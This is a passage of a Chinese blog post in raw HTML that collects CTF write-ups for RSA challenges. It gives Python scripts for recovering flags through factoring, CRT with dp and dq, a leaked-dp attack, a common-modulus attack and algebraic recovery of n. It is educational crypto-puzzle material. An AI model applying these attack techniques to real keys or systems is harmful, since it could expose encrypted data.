class="line">print(flag)</span><br></pre></td></tr></table></div></figure><p>得到明文flag<br><img src="https://img-blog.csdnimg.cn/20200930110203438.png#pic_center" alt="在这里插入图片描述"><br><em>方法二</em>：利用<code>gmpy2</code>直接写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">C = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"><span class="comment">#1.求d</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment">#2.求n</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="comment">#3.m=pow(c,d,n)</span></span><br><span class="line">flag = <span class="built_in">pow</span>(C,d,n)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></div></figure><p>得到明文flag<br><img src="https://img-blog.csdnimg.cn/20201004194955531.png#pic_center" alt="在这里插入图片描述"></p>        <h3 id="4-2-2-已知c、q、n、e，求明文m"   >          <a href="#4-2-2-已知c、q、n、e，求明文m" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-2-2-已知c、q、n、e，求明文m" class="headerlink" title="4.2.2 已知c、q、n、e，求明文m"></a>4.2.2 已知c、q、n、e，求明文m</h3>      <p><span class="exturl"><a class="exturl__link"   href="https://www.cnblogs.com/shenshuoyaoyouguang/p/14025343.html" >参考文章</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>给了 c, q, n ,e</p><p>求 p : n//q</p><p>求 d: d = invmod(e,(p-1)*(q-1))</p><p>求 flag : flag = pow(c,d,n)</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149</span></span><br><span class="line">q = <span class="number">166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043</span></span><br><span class="line">c = <span class="number">177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p = n//q</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line">i = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(libnum.n2s(i))</span><br></pre></td></tr></table></div></figure><p><img src="https://img-blog.csdnimg.cn/20201129000806367.png" alt="在这里插入图片描述"></p>        <h3 id="4-3-已知n、e、密文c，求明文m"   >          <a href="#4-3-已知n、e、密文c，求明文m" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-3-已知n、e、密文c，求明文m" class="headerlink" title="4.3 已知n、e、密文c，求明文m"></a>4.3 已知n、e、密文c，求明文m</h3>      <p><strong>[ctfshow]easyrsa1</strong><br><img src="https://img-blog.csdnimg.cn/20201004200123150.png#pic_center" alt="在这里插入图片描述"><br>分解质因数n<br><img   src="https://img-blog.csdnimg.cn/202010042038209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>编写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">1455925529734358105461406532259911790807347616464991065301847</span></span><br><span class="line">c = <span class="number">69380371057914246192606760686152233225659503366319332065009</span></span><br><span class="line"><span class="comment">#1.将n分解为p和q</span></span><br><span class="line">p = <span class="number">1201147059438530786835365194567</span></span><br><span class="line">q = <span class="number">1212112637077862917192191913841</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>) </span><br><span class="line"><span class="comment">#2.求d</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment">#3.m=pow(c,d,n)</span></span><br><span class="line">m = gmpy2.powmod(c,d,n) </span><br><span class="line">print(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#binascii.unhexlify(hexstr):从十六进制字符串hexstr返回二进制数据</span></span><br></pre></td></tr></table></div></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/202010042008171.png#pic_center" alt="在这里插入图片描述"><br>注：<br>1.在线分解质因数：<span class="exturl"><a class="exturl__link"   href="http://www.factordb.com/" >http://www.factordb.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p><p>2.代码中涉及到了<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/xc_zhou/article/details/82079762" >python之binascii模块</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>相关知识</p>        <h3 id="4-4-已知public-key、密文c，求明文m"   >          <a href="#4-4-已知public-key、密文c，求明文m" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-4-已知public-key、密文c，求明文m" class="headerlink" title="4.4 已知public key、密文c，求明文m"></a>4.4 已知public key、密文c，求明文m</h3>      <p> <strong>[BUUCTF]RSA</strong><br>下载附件<br><img src="https://img-blog.csdnimg.cn/20201011162231603.png#pic_center" alt="在这里插入图片描述"><br>用记事本打开pub.key<br><img   src="https://img-blog.csdnimg.cn/20201011162321313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br><span class="exturl"><a class="exturl__link"   href="http://tool.chacuo.net/cryptrsakeyparse" >解析公钥</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><img   src="https://img-blog.csdnimg.cn/20201011162453842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>模数和指数即为n和e，还需要把n从十六进制转换为十进制<br><img   src="https://img-blog.csdnimg.cn/20201011162645687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br><span class="exturl"><a class="exturl__link"   href="http://www.factordb.com/" >分解n</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，得到p和q</p><p><img   src="https://img-blog.csdnimg.cn/20201011162813249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>接下来就是通过脚本求出明文m</p><p>脚本需要用到python的rsa库，在cmd中输入<code>pip install rsa</code>即可完成安装<br><img   src="https://img-blog.csdnimg.cn/20201011163120354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"> </span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line"> </span><br><span class="line">phin = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line"> </span><br><span class="line">key=rsa.PrivateKey(n,e,<span class="built_in">int</span>(d),p,q)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f=f.read()</span><br><span class="line">    print(rsa.decrypt(f,key))</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>运行脚本，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201011163224705.png#pic_center" alt="在这里插入图片描述"></p>        <h3 id="4-5-已知p、q、dp、dq、c求明文m"   >          <a href="#4-5-已知p、q、dp、dq、c求明文m" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-5-已知p、q、dp、dq、c求明文m" class="headerlink" title="4.5 已知p、q、dp、dq、c求明文m"></a>4.5 已知p、q、dp、dq、c求明文m</h3>      <p><strong>[BUUCTF]RSA1</strong></p><p>这道题属于已知p、q、dp、dq、c求明文类型<br><img   src="https://img-blog.csdnimg.cn/20201005193829462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br><span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/MikeCoke/article/details/105959599" >上脚本</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">I = gmpy2.invert(q,p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c,dq,q)               <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = (((mp-mq)*I)%p)*q+mq       <span class="comment">#求明文公式</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(m))                  <span class="comment">#转为十六进制</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/20201005194550372.png#pic_center" alt="在这里插入图片描述"><br>然后将16进制转换成字符串</p><p><img   src="https://img-blog.csdnimg.cn/20201005194804576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h3 id="4-6已知n、e、dp、c，求m"   >          <a href="#4-6已知n、e、dp、c，求m" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-6已知n、e、dp、c，求m" class="headerlink" title="4.6已知n、e、dp、c，求m"></a>4.6已知n、e、dp、c，求m</h3>      <p><strong>[BUUCTF]RSA2</strong></p><p>下载附件，题目给出公钥n,e以及dp<br><img   src="https://img-blog.csdnimg.cn/20201011163855598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp=d%(p-<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure><p>脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">import</span>  rsa</span><br><span class="line"><span class="keyword">import</span>  binascii</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">dp=<span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">n=<span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">temp=dp*e</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e) :</span><br><span class="line">    <span class="keyword">if</span> (temp-<span class="number">1</span>)%i==<span class="number">0</span>:</span><br><span class="line">        x=(temp-<span class="number">1</span>)//i+<span class="number">1</span></span><br><span class="line">        y=n%x</span><br><span class="line">        <span class="keyword">if</span> y==<span class="number">0</span>:</span><br><span class="line">            p=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">q=n//p</span><br><span class="line"><span class="comment">#&#x27;//&#x27;代表向下取整,&#x27;/&#x27;得到的是浮点数</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">key=rsa.PrivateKey(n,e,d,p,q)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#unhexlify()的作用是返回16进制数对应的字符串</span></span><br></pre></td></tr></table></div></figure><p>运行结果<br><img src="https://img-blog.csdnimg.cn/20201011164021212.png#pic_center" alt="在这里插入图片描述"></p>        <h3 id="4-7共模攻击"   >          <a href="#4-7共模攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-7共模攻击" class="headerlink" title="4.7共模攻击"></a>4.7共模攻击</h3>      <p><strong>[BUUCTF]RSA3</strong><br>出现两个加密使用相同的模，可以在不知道私钥的情况下得到明文，这就是RSA中的<strong>共模攻击</strong>。<br><img   src="https://img-blog.csdnimg.cn/20201011164858631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="comment"># 欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">  c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">  c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">  e1 = <span class="number">11187289</span></span><br><span class="line">  e2 = <span class="number">9647291</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line">  print(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>运行脚本，得到明文m<br><img src="https://img-blog.csdnimg.cn/20201011164737363.png#pic_center" alt="在这里插入图片描述"><br>转16进制</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span>c61677b34396439313037376131616263623134663161396435343663383062653965667d</span><br></pre></td></tr></table></div></figure><p>十六进制转字符串<br><img   src="https://img-blog.csdnimg.cn/20201109201954658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h3 id="4-8已知p-q、（p-1-q-1-、e、d、以及密文C，求明文m"   >          <a href="#4-8已知p-q、（p-1-q-1-、e、d、以及密文C，求明文m" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-8已知p-q、（p-1-q-1-、e、d、以及密文C，求明文m" class="headerlink" title="4.8已知p+q、（p+1)(q+1)、e、d、以及密文C，求明文m"></a>4.8已知p+q、（p+1)(q+1)、e、d、以及密文C，求明文m</h3>      <p><strong>[GUET-CTF2019]BabyRSA</strong><br><img   src="https://img-blog.csdnimg.cn/20210201110739494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>已知<code>p+q</code>、<code>（p+1)(q+1</code>)、<code>e</code>、<code>d</code>,以及密文<code>c</code>.</p><p>利用 RSA的解密公式：</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M=C^d  mod n</span><br><span class="line">n = p*q</span><br></pre></td></tr></table></div></figure><p>所以推算出求n的公式</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = (p+<span class="number">1</span>)*(q+<span class="number">1</span>) - (p+q) - <span class="number">1</span></span><br></pre></td></tr></table></div></figure><p>脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">a = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">b = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">c= <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line"></span><br><span class="line">n = b-a-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line">print(libnum.n2s(m))  <span class="comment">#（n2s将数值转化为字符串）</span></span><br></pre></td></tr></table></div></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/20210201111109395.png" alt="在这里插入图片描述"></p><hr><p>看到一份来自漏斗社区的<span class="exturl"><a class="exturl__link"   href="https://www.freebuf.com/column/148898.html" >RSA解题思路思维导图</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，收藏起来8。</p><p><img   src="https://img-blog.csdnimg.cn/20201004175237397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  